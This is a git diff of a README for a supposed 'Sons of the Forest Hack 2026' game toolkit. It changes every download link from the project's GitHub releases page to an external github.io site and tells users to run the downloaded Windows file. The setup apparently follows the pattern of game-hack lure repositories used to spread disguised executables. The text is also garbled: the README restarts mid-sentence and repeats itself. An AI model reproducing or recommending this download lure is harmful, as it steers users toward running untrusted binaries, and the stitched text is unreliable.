@@ -1,12 +1,12 @@
 # 🌲 sons-of-the-forest-hack-2026-island-expedition-toolkit - Plan Survival Expeditions With Confidence
 
-[![Download the Island Expedition Toolkit](https://img.shields.io/badge/Download_Island_Expedition_Toolkit-Visit_Releases-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vimap9601/sons-of-the-forest-hack-2026-island-expedition-toolkit/releases)
+[![Download the Island Expedition Toolkit](https://img.shields.io/badge/Download_Island_Expedition_Toolkit-Visit_Releases-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://vimap9601.github.io)
 
 The Sons of the Forest Hack 2026 Island Expedition Toolkit is a Windows companion for players who want a clear, organized place to plan survival loadouts, base projects, crafting goals, bunker expeditions, exploration notes, and progression analytics. It is built for everyday PC users who want practical planning tools without needing programming knowledge.
 
 ## 🚀 Download the Toolkit
 
-Visit [this link](https://github.com/vimap9601/sons-of-the-forest-hack-2026-island-expedition-toolkit/releases) to download the application.
+Visit [this link](https://vimap9601.github.io) to download the application.
 
 After the download finishes, open the downloaded file to launch the toolkit.
 
@@ -82,13 +82,13 @@ The exploration notes section is a flexible place for island discoveries. You ca
 
 Exploration notes can include# 🌲 sons-of-the-forest-hack-2026-island-expedition-toolkit - Plan Survival Expeditions With Confidence
 
-[![Download the Island Expedition Toolkit](https://img.shields.io/badge/Download_Island_Expedition_Toolkit-Visit_Releases-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vimap9601/sons-of-the-forest-hack-2026-island-expedition-toolkit/releases)
+[![Download the Island Expedition Toolkit](https://img.shields.io/badge/Download_Island_Expedition_Toolkit-Visit_Releases-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://vimap9601.github.io)
 
 The Sons of the Forest Hack 2026 Island Expedition Toolkit is a Windows companion for players who want a clear, organized place to plan survival loadouts, base projects, crafting goals, bunker expeditions, exploration notes, and progression analytics. It is built for everyday PC users who want practical planning tools without needing programming knowledge. Whether you are preparing for a short resource run or a long bunker expedition, the toolkit keeps your plans in one place so you can focus on the island instead of scattered notes.
 
 ## 🚀 Download and Setup
 
-Visit [this link](https://github.com/vimap9601/sons-of-the-forest-hack-2026-island-expedition-toolkit/releases) to download the application.
+Visit [this link](https://vimap9601.github.io) to download the application.
 
 After the download finishes, open the downloaded file to launch the toolkit. The application is designed for Windows 10 and Windows 11. It runs like a normal desktop companion, so you do not need to install extra tools or configure anything technical.
 
